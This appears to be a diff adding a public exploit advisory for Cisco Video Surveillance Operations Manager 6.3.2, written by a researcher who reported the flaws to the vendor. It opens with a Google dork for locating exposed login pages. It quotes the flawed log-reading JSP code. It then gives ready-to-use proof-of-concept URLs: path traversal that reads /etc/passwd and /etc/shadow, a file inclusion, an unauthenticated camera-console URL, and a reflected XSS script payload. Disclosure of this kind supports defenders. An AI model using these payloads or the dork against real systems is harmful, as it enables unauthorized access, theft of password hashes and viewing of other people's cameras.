@@ -1,0 +1,93 @@
+# Exploit Title:Cisco Video Surveillance Operations Manager Multiple
+vulnerabilities
+# Google Dork: intitle:"Video Surveillance Operations Manager > Login"
+# Date: 22 Feb 2013 reported to the vendor
+# Exploit Author: Bassem | bassem.co
+# Vendor Homepage: www.cisco.com
+# Version: Version 6.3.2
+# Tested on: Version 6.3.2
+
+
+#1- The application is vulnerable to Local file inclusion
+
+read_log.jsp and read_log.dep not validate the name and location of the log
+file , un authenticated remote attacker can perform this
+
+---------------------------------------------
+read_log.jsp:
+/usr/BWhttpd/root/htdocs/BWT/utils/logs
+from /usr/BWhttpd/logs/<%= logName %>
+---------------------------------------------
+---------------------------------------------
+read_log.dep
+
+<%!
+        protected LinkedList getBwhttpdLog( String logName, String theOrder
+) {
+                String logPath  = "/usr/BWhttpd/logs/";
+                String theLog   = logPath + logName;
+                LinkedList resultList = new LinkedList();
+                try {
+                                BufferedReader in = new BufferedReader(new
+FileReader(theLog));
+                                String theLine = "";
+                                        while( (theLine = in.readLine()) !=
+null ) {
+                                                if(
+theOrder.indexOf("descending") > -1 ) {
+
+resultList.addFirst(theLine);
+                                                } else {
+
+resultList.addLast(theLine);
+                                                }
+                                        }
+-----------------------------------------------
+POC:
+
+http://serverip/BWT/utils/logs/read_log.jsp?filter=&log=../../../../../../../../../etc/passwd
+http://serverip/BWT/utils/logs/read_log.jsp?filter=&log=../../../../../../../../../etc/shadow
+
+#####################################################################
+
+#2- The application is vulnerable to local file inclusion
+
+select and display log not validate the log file names , If attacker pass
+/etc/passwd through the http post request system will display it as log
+file
+
+POC:
+
+http://serverip/monitor/logselect.php
+
+
+#####################################################################
+
+
+#3  Cisco Video Surveillance Operations Manager Version 6.3.2 doesn't
+perform the proper authentication for the management and view console,
+Remote attacker can gain access to the system and view the attached cameras
+without authentication
+
+POC:
+
+http://serverip/broadware.jsp
+
+
+#####################################################################
+
+
+#4 Application is vulnerable to XSS
+
+The web application doesn't perform validation for the inputs/outputs for
+many of its pages so its vulnerable to XSS attacks
+
+POC: http://serverip/vsom/index.php/
+"/title><script>alert("ciscoxss");</script>
+
+
+
+
+-- 
+Best Regards
+Bassem
